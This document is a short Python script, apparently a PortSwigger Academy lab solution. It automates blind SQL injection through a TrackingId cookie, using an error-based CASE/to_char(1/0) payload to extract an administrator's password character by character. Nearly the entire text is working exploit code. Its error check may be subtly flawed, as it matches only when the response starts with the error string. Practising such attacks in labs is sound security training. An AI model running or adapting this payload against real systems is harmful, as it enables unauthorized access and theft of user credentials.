# wrote this script for a lab on portswigger net academy

import requests

url = input("Paste the URL:")
password = ""
keysd = "0123456789"
keysam = "abcdefghijklm"
keysnz = "nopqrstuvwxyz"

def request(x,y,z):
    data = requests.get(url,
            cookies={f"TrackingId": "poo'+UNION+SELECT+CASE+WHEN+(username+=+'administrator'"
                     f"+and+substr(password,{x},1)+{z}+'{y}')+THEN+to_char(1/0)+ELSE+NULL+END+FROM+users--",
                      "session": "lookmumnohands"}).text
    
    if data.find("Internal Server Error") == 0:
        return True

for i in range(1,21):
    if request(i,"n",">="):
        for j in keysnz:
            if request(i,j,"="):
                password += j
                print(password)
                break
    elif request(i,"a",">="):
        for j in keysam:
            if request(i,j,"="):
                password += j
                print(password)
                break
    else:
        for j in keysd:
            if request(i,j,"="):
                password += j
                print(password)
                break
